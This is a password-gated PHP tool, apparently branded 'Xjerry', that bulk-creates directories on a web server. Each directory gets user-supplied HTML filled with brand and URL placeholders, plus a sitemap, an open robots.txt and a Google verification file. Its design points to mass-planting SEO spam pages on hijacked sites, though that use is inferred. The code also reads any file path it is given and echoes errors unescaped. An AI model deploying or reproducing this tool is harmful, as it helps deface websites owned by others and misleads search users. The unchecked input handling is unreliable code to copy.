<?php
session_start();

$success = false;
$error = '';

$hashedPassword = '$2y$10$wb8O6J40EoLD2BrUNncxeut08vZXXD6I1XukczvM0VTTtxiwMmlsi';

// Check if the password has been submitted and is correct
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['password'])) {
    if (password_verify($_POST['password'], $hashedPassword)) {
        $_SESSION['authenticated'] = true;
    } else {
        $error = "Salah Passwordnya Cokk.";
    }
}

// Check if the user is authenticated
if (!isset($_SESSION['authenticated'])) {
    // Display the password prompt
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Directory and File Creation - Xjerry</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
        <style>
            body {
                background-color: #000;
                font-family: Arial, sans-serif;
                padding: 20px;
                color: white;
            }
            .container {
                max-width: 400px;
                margin: 0 auto;
                background-color: #000080;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            }
            .btn-primary {
                background-color: #FFA500;
                border-color: #007bff;
            }
            .btn-primary:hover {
                background-color: #0056b3;
                border-color: #004085;
            }
            h2 {
                color: white;
            }
            footer {
            color: white;
            text-align: center;
            padding: 10px;
            margin-top: 20px;
            border-radius: 8px;
        }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Masukan Password</h2>
            <?php if (!empty($error)): ?>
                <div class="alert alert-danger"><?php echo $error; ?></div>
            <?php endif; ?>
            <form method="post" action="">
                <div class="form-group">
                    <label for="password">Enter Password:</label>
                    <input type="password" class="form-control" id="password" name="password" required>
                </div>
                <button type="submit" class="btn btn-primary">Submit</button>
            </form>
        </div>
        <footer>
        <p>&copy; 2024 Xjerry. All rights reserved.</p>
    </footer>
    </body>
    </html>
    <?php
    exit;
}

// Check if form is submitted
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['list_file']) && isset($_POST['html_content'])) {
    // Get the list file name, HTML content, domain name, and Google verification file name from the form
    $listFileName = trim($_POST['list_file']);
    $htmlContent = $_POST['html_content'];
    $baseDirectory = isset($_POST['base_directory']) ? trim($_POST['base_directory'], '/') : '';
    $domainName = isset($_POST['domain_name']) ? rtrim(trim($_POST['domain_name']), '/') : '';
    $googleFileName = isset($_POST['google_file_name']) ? trim($_POST['google_file_name']) : 'googlef4354a370afafa05.html';

    // Ensure that the base directory is properly formatted
    $baseDirectoryPath = !empty($baseDirectory) ? $baseDirectory . '/' : '';

    // Check if the list file exists
    if (!file_exists($listFileName)) {
        $error = "Error: $listFileName file not found.";
    }

    if (empty($error)) {
        // Read the list file
        $names = file($listFileName, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

        if (empty($names)) {
            $error = "Error: $listFileName is empty or not formatted correctly.";
        } else {
            // Loop through each name and create the directory with the necessary files
            foreach ($names as $name) {
                $name = trim($name); // Clean up any surrounding spaces

                // Create the full directory path including base directory and name from list
                $dirPath = __DIR__ . '/' . $baseDirectoryPath . $name;
                if (!is_dir($dirPath)) {
                    if (!mkdir($dirPath, 0755, true)) {
                        $error = "Error: Could not create directory $dirPath.";
                        break;
                    }
                }

                // Replace placeholders in the HTML content
                $url = !empty($domainName) ? $domainName . '/' . trim($baseDirectoryPath . $name, '/') . '/' : ''; // Construct the full URL with trailing slash if domain is provided
                $brand = strtoupper($name); // Brand name in uppercase
                $amp = strtolower($name); // Brand name in lowercase

                // Replace the placeholders in the HTML content
                $finalHtmlContent = str_replace(
                    ['{{ URL }}', '{{ BRAND }}', '{{ AMP }}'],
                    [$url, $brand, $amp],
                    $htmlContent
                );

                // File paths
                $indexFilePath = $dirPath . '/index.html';
                $sitemapFilePath = $dirPath . '/sitemap.xml';
                $robotsFilePath = $dirPath . '/robots.txt';
                $googleFilePath = $dirPath . '/' . $googleFileName;

                // File contents for sitemap.xml, robots.txt, and google verification
                $sitemapContent = !empty($domainName) ? "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
<url>
    <loc>$url</loc>
    <lastmod>" . date('Y-m-d') . "</lastmod>
    <changefreq>weekly</changefreq>
    <priority>1.00</priority>
</url>
</urlset>" : '';
                $robotsContent = "User-agent: *\nDisallow:";
                $googleFileContent = "google-site-verification: " . basename($googleFileName);

                // Write the files
                if (!file_put_contents($indexFilePath, $finalHtmlContent)) {
                    $error = "Error: Could not create file $indexFilePath.";
                    break;
                }

                if (!empty($domainName) && !file_put_contents($sitemapFilePath, $sitemapContent)) {
                    $error = "Error: Could not create file $sitemapFilePath.";
                    break;
                }

                if (!file_put_contents($robotsFilePath, $robotsContent)) {
                    $error = "Error: Could not create file $robotsFilePath.";
                    break;
                }

                if (!file_put_contents($googleFilePath, $googleFileContent)) {
                    $error = "Error: Could not create file $googleFilePath.";
                    break;
                }

                chmod($indexFilePath, 0644);
                if (!empty($domainName)) {
                    chmod($sitemapFilePath, 0644);
                }
                chmod($robotsFilePath, 0644);
                chmod($googleFilePath, 0644);
            }

            if (empty($error)) {
                $success = true;
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Directory and File Creation - Xjerry</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        body {
            background-color: #000;
            font-family: Arial, sans-serif;
            padding: 20px;
            color: white;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: #000080;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .btn-primary {
            background-color: #FFA500;
            border-color: #007bff;
        }
        .btn-primary:hover {
            background-color: #0056b3;
            border-color: #004085;
        }
        h2, label {
            color: white;
        }
        textarea {
            width: 100%;
            height: 200px;
            margin-top: 10px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            padding: 10px;
        }
        /* Footer styles */
        footer {
            color: white;
            text-align: center;
            padding: 10px;
            margin-top: 20px;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Create Directories, Files, Sitemap, Robots from list.txt</h2>
        <form method="post" action="">
            <div class="form-group">
                <label for="domain_name">Domain Name (https://namadomain.com):</label>
                <input type="text" class="form-control" id="domain_name" name="domain_name" placeholder="Enter your domain name">
            </div>
            <div class="form-group">
                <label for="base_directory">Base Directory (directory1/directory2/directory3):</label>
                <input type="text" class="form-control" id="base_directory" name="base_directory" placeholder="Enter base directory">
            </div>
            <div class="form-group">
                <label for="list_file">List File (list.txt):</label>
                <input type="text" class="form-control" id="list_file" name="list_file" placeholder="Enter list file name" required>
            </div>
            <div class="form-group">
                <label for="html_content">HTML Content for index.html:</label>
                <textarea id="html_content" name="html_content" placeholder="Enter the HTML content for index.html" required></textarea>
            </div>
            <div class="form-group">
                <label for="google_file_name">Google Verification File Name (googlef4354a370afafa05.html):</label>
                <input type="text" class="form-control" id="google_file_name" name="google_file_name" placeholder="Enter Google verification file name">
            </div>
            <button type="submit" class="btn btn-primary">Create Directories and Files</button>
        </form>
    </div>

    <?php if ($success): ?>
    <script>
        Swal.fire({
            icon: 'success',
            title: 'Success',
            html: 'Directories and files created successfully!',
            showConfirmButton: true,
            confirmButtonText: 'OK',
            confirmButtonColor: '#007bff'
        });
    </script>
    <?php elseif (!empty($error)): ?>
    <script>
        Swal.fire({
            icon: 'error',title: 'Error',
            html: '<?php echo $error; ?>',
            showConfirmButton: true,
            confirmButtonText: 'OK',
            confirmButtonColor: '#007bff'
        });
    </script>
    <?php endif; ?>
    <center><h2>Masukan Script Dibawah ini Ke Dalam Sript Html Anda</h2></center>
    <center><p>{{ URL }} = Ganti Url Anda Dengan ini</p>
    <p>{{ BRAND }} = Ganti Nama Brand Anda Dengan ini (Jika Anda Menginginkan Dengan Huruf Kapital)</p>
    <p>{{ AMP }} = Ganti Nama Brand Anda Dengan ini (JIka Anda Menginginkan Dengan Huruf Kecil)</p></center>
    <footer>
        <p>&copy; 2024 Xjerry. All rights reserved.</p>
    </footer>
</body>
</html>
